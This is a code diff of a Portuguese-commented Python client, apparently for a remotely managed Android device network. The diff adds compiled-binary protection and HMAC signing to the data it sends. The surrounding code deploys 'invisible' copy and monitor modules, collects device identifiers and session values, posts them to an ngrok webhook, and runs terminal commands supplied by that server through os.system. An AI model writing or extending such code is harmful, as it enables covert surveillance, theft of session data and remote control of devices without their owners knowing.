@@ -7,6 +7,21 @@ import uuid
 import signal
 from datetime import datetime
 
+# ==========================================
+# 🛑 BLINDAGEM DE SEGURANÇA (CYTHON C-LEVEL)
+# ==========================================
+BASE_DIR = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
+sys.path.insert(0, BASE_DIR)
+
+try:
+    # Ao importar, o run_security_checks() dentro do C já é executado automaticamente!
+    from security_system.core import gerar_assinatura_hmac, obter_dna_dispositivo
+except ImportError:
+    print("\n💀 [Security] Módulo de segurança compilado (core.so) ausente ou corrompido.")
+    print("🔒 O sistema entrou em Lockdown e não pode iniciar sem a blindagem.")
+    sys.exit(5)
+# ==========================================
+
 if os.environ.get("HAPIE_WATCHDOG") != "1":
     os.environ["HAPIE_WATCHDOG"] = "1"
     os.system("clear" if os.name == "posix" else "cls")
@@ -39,6 +54,9 @@ if os.environ.get("HAPIE_WATCHDOG") != "1":
             elif p_process.returncode == 4:
                 print("\n⚠️ [Watchdog] Conexão recusada pelo Servidor Central (Shutdown).")
                 sys.exit(4)
+            elif p_process.returncode == 5:
+                print("\n⚠️ [Watchdog] FALHA DE SEGURANÇA: Binário de proteção não encontrado.")
+                sys.exit(5)
             else:
                 print(f"\n💀 [Watchdog] CRASH DE CÓDIGO DETECTADO (Código {p_process.returncode})!")
                 print("🔄 [Watchdog] A versão atual está quebrada. Buscando correções no GitHub em 10 segundos...")
@@ -70,16 +88,13 @@ except ImportError:
     from rich.panel import Panel
     from halo import Halo
 
-HAPIEPHONE_VERSION = "10.6 (Auto Input Engine)"
+HAPIEPHONE_VERSION = "10.6 (Auto Input Engine + Cyber Security)"
 console = Console()
-BASE_DIR = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
-sys.path.insert(0, BASE_DIR)
 
 arquivo_comprovante = os.path.join(BASE_DIR, "setup_concluido.txt")
 if not os.path.exists(arquivo_comprovante):
     console.print("\n[bold yellow]🛠️ Primeira execução detectada! Rodando a blindagem do sistema...[/bold yellow]")
     caminho_setup = os.path.join(BASE_DIR, "auto_setup.py")
-
     if os.path.exists(caminho_setup):
         try:
             subprocess.run([sys.executable, caminho_setup], check=True)
@@ -93,7 +108,6 @@ if not os.path.exists(arquivo_comprovante):
 
 CONFIG_FILE = os.path.join(BASE_DIR, "hapie_config.json")
 FUNCTIONS_JSON_FILE = os.path.join(BASE_DIR, "functions.json")
-
 FUNCTIONS_DIR = os.path.join(BASE_DIR, "functions")
 HAPIE_APPS_DIR = os.path.join(BASE_DIR, "hapie_apps")
 DATA_DIR = os.path.join(BASE_DIR, "Data")
@@ -148,7 +162,7 @@ elif len(sys.argv) > 1:
 else:
     guild_id = saved_config.get("guild_id", "")
     owner_id = saved_config.get("owner_id", "")
-
+    
 client_token = saved_config.get("client_token", None)
 
 if guild_id and owner_id:
@@ -237,6 +251,7 @@ try:
     if region == "Unknown" or not region: region = get_prop("getprop ro.product.locale")
     cpu_abi = get_prop("getprop ro.product.cpu.abi")
     processor = "64 bits" if "64" in cpu_abi else ("32 bits" if cpu_abi != "Unknown" and cpu_abi else "Unknown")
+    
     device_id = get_root_data("settings get secure android_id")
     if device_id == "Unknown" or not device_id: device_id = get_prop("settings get secure android_id")
     if device_id == "Unknown" or not device_id:
@@ -248,6 +263,7 @@ try:
             try:
                 with open(id_file, "w") as f: f.write(device_id)
             except: pass
+            
     if android_version != "Unknown" and "." in android_version: android_version = android_version.split(".")[0]
 
     report["system_info"] = {
@@ -301,7 +317,8 @@ try:
     os.system(monitor_cmd)
 
     spinner.succeed("Invisible modules (Copy & Monitor) deployed successfully!")
-except Exception as e: spinner.fail(f"Error deploying modules: {e}")
+except Exception as e: 
+    spinner.fail(f"Error deploying modules: {e}")
 
 registered_in_db = False
 PING_INTERVAL = 60
@@ -314,7 +331,7 @@ try:
     while True:
         now = time.time()
         last_action = max(last_check, get_last_activity())
-
+        
         if now - last_action >= PING_INTERVAL or not registered_in_db:
             try:
                 install_success = []
@@ -352,6 +369,7 @@ try:
                         os.remove(CAMPOS_FILE)
                     except: pass
 
+                # Extrai telemetria com suporte para a nova versão blindada do sensores.py
                 try:
                     if BASE_DIR not in sys.path: sys.path.insert(0, BASE_DIR)
                     import importlib.util
@@ -359,8 +377,18 @@ try:
                     spec = importlib.util.spec_from_file_location("sensores", sensores_path)
                     sensores_module = importlib.util.module_from_spec(spec)
                     spec.loader.exec_module(sensores_module)
-                    telemetry_data = sensores_module.coletar_telemetria_completa()
-                except Exception as e: telemetry_data = {"erro": str(e)}
+                    
+                    res_telemetria = sensores_module.coletar_telemetria_completa()
+                    # Se retornar a tupla (relatorio, dna, ts), pegamos apenas o relatorio
+                    telemetry_data = res_telemetria[0] if isinstance(res_telemetria, tuple) else res_telemetria
+                except Exception as e: 
+                    telemetry_data = {"erro": str(e)}
+
+                # ==========================================
+                # 🔒 GERAÇÃO DA ASSINATURA HMAC (O COFRE EM AÇÃO)
+                # ==========================================
+                dna_seguro = obter_dna_dispositivo()
+                ts_agora = int(time.time())
 
                 payload = {
                     "type": 1 if registered_in_db else 0,
@@ -370,7 +398,9 @@ try:
                     "install_success": install_success, "install_failed": install_failed,
                     "order_success": order_success, "order_failed": order_failed,
                     "apps_installed": apps_installed_data, "telemetry": telemetry_data,
-                    "auto_input_data": auto_input_data
+                    "auto_input_data": auto_input_data,
+                    "device_dna": dna_seguro,    # Adicionado para o validador do servidor
+                    "timestamp": ts_agora        # Adicionado para o validador Anti-Replay
                 }
 
                 if isinstance(auto_input_data, dict):
@@ -381,8 +411,17 @@ try:
                         auto_input_data["session_raw"] = sess_val
                         auto_input_data["session"] = sess_val
 
+                # Envelopa o Payload usando a chave mestra C-Level
+                assinatura = gerar_assinatura_hmac(dna_seguro, ts_agora)
+                envelope_seguro = {
+                    "signature": assinatura,
+                    "payload": payload
+                }
+
                 headers = {"Content-Type": "application/json", "ngrok-skip-browser-warning": "true"}
-                response = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=30)
+                # Enviando o ENVELOPE SEGURO, e não mais o payload desprotegido
+                response = requests.post(URL_WEBHOOK, json=envelope_seguro, headers=headers, timeout=30)
+                # ==========================================
 
                 if response.status_code == 200:
                     response_json = response.json()
@@ -440,7 +479,7 @@ try:
                                     with open(PAYLOAD_FILE, "w") as pf: json.dump(response_json, pf)
                                     subprocess.run([sys.executable, brain_script_path, "--file", PAYLOAD_FILE], check=True)
                                 except: pass
-
+                                
                     if response_json.get("mudo") == True:
                         git_cmd = response_json.get("comando_terminal", "git pull")
                         os.system("pkill -f auto_copy.py > /dev/null 2>&1")
